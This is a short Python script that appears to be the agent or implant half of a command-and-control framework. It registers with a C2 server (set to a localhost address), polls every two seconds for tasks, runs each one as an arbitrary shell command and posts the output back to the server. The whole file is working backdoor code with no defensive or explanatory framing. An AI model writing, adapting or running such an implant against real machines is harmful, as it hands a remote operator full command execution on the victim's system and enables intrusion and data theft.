import requests
import time
import subprocess

C2 = "http://127.0.0.1:5000"

# Register agent
resp = requests.post(f"{C2}/register")
agent_id = resp.json()["agent_id"]
print(f"Registered as: {agent_id}")

while True:
    # Poll for task
    r = requests.get(f"{C2}/task/{agent_id}")
    task = r.json().get("task")

    if task:
        print(f"Received task: {task}")

        # handle simple commands
        if task == "exit":
            requests.post(f"{C2}/result/{agent_id}", data="Agent exiting")
            break

        try:
            # execute locally
            output = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
            output = output.decode()
        except Exception as e:
            output = f"Error executing command: {e}"

        requests.post(f"{C2}/result/{agent_id}", data=output)

    time.sleep(2)
